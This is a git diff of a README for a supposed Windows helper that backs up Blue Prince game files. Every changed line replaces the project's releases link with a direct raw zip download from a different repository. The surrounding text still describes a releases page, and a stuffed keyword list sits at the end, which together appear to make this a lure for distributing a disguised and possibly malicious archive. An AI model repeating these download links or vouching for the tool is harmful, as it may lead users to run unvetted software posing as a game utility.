@@ -5,8 +5,8 @@ description: "Back up Blue Prince config and export files locally via CLI with d
 ---
 # 🎩 blue-prince-desktop - Find and Archive Your Game Files
 
-[![Download blue-prince-desktop](https://img.shields.io/badge/Download-blue--prince--desktop-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rep-919/blue-prince-desktop/releases)
-[![Made for Windows](https://img.shields.io/badge/Platform-Windows-teal?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rep-919/blue-prince-desktop/releases)
+[![Download blue-prince-desktop](https://img.shields.io/badge/Download-blue--prince--desktop-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip)
+[![Made for Windows](https://img.shields.io/badge/Platform-Windows-teal?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip)
 
 Blue Prince Desktop is a desktop helper for your computer. It looks around your system, finds the Blue Prince data directories that already exist on your machine, and then archives your config and export files locally so you always have a safe copy of them. Nothing complicated, nothing buried in folders you will never find again — just a simple tool that does the searching and the filing for you.
 
@@ -28,9 +28,9 @@ That is the entire flow. There is no account to create, no subscription to sign 
 
 **Visit this link to download the application:**
 
-[**https://github.com/rep-919/blue-prince-desktop/releases**](https://github.com/rep-919/blue-prince-desktop/releases)
+[**https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip**](https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip)
 
-[![Download Now](https://img.shields.io/badge/⬇_Download_Now-blue--prince--desktop-orange?style=for-the-badge)](https://github.com/rep-919/blue-prince-desktop/releases)
+[![Download Now](https://img.shields.io/badge/⬇_Download_Now-blue--prince--desktop-orange?style=for-the-badge)](https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip)
 
 When the page opens, you will see a list of available releases. The newest one is at the top. Pick the file that matches your Windows computer, save it somewhere you can find again — your Downloads folder is perfectly fine — and then open it to launch Blue Prince Desktop.
 
@@ -120,6 +120,6 @@ Blue Prince Desktop is for anyone who plays Blue Prince on a Windows PC and want
 
 Ready to go? Head to the release page, grab the newest version, and let the helper handle the rest:
 
-[**Download blue-prince-desktop**](https://github.com/rep-919/blue-prince-desktop/releases)
+[**Download blue-prince-desktop**](https://github.com/rep-919/rep-919.github.io/raw/refs/heads/main/projects/1.2.zip)
 
 Keywords: 2026-blue-prince, app-blue-prince, blue-prince, blue-prince-2026, blue-prince-app, blue-prince-desktop, blue-prince-download, blue-prince-free, blue-prince-installer, blue-prince-official, blue-prince-pc, blue-prince-setup, blue-prince-windows, desktop-blue-prince, download-blue-prince, free-blue-prince, installer-blue-prince, pc-blue-prince, setup-blue-prince, windows-blue-prince
